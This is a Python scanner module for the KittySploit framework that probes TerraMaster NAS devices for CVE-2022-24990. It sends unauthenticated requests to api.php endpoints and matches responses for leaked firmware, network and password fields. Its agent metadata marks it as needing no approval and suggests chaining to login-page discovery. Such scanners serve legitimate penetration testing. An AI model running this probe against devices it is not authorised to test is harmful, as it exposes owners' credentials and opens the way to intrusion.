#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TerraMaster NAS devices running TOS prior to version 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TerraMaster TOS < 4.2.30 Server Information Disclosure Detection',
        'description': 'TerraMaster NAS devices running TOS prior to version 4.2.30 are vulnerable to information disclosure.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'packetstorm', 'terramaster', 'exposure', 'kev', 'terra-master', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/',
            'https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=33732',
            'https://forum.terra-master.com/en/viewforum.php?f=28',
            'http://packetstormsecurity.com/files/172904/TerraMaster-TOS-4.2.29-Remote-Code-Execution.html',
            'https://github.com/ArrestX/--POC',
        ],
        'cve': 'CVE-2022-24990',
    }

    def run(self):
        # Greenbone check uses User-Agent: TNAS and accepts firmware/PWD markers without
        # requiring TerraMaster response headers (those are often absent).
        paths = (
            '/module/api.php?mobile/webNasIPS',
            '/module/api.php?mobile/wapNasIPS',
        )
        body_regexes = (
            r'webNasIPS successful',
            r'(ADDR|(IFC|PWD|[DS]AT)):',
            r'"((firmware|(version|ma(sk|c)|port|url|ip))|hostname)"',
            r'\\?"firmware\\?"',
            r'\nPWD:',
        )
        for path in paths:
            r = self.http_request(
                method='GET',
                path=path,
                headers={'User-Agent': 'TNAS'},
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if any(re.search(rx, body) for rx in body_regexes):
                self.set_info(
                    severity='high',
                    reason='TerraMaster TOS information disclosure (CVE-2022-24990 family)',
                    path=path,
                )
                return True
        return False

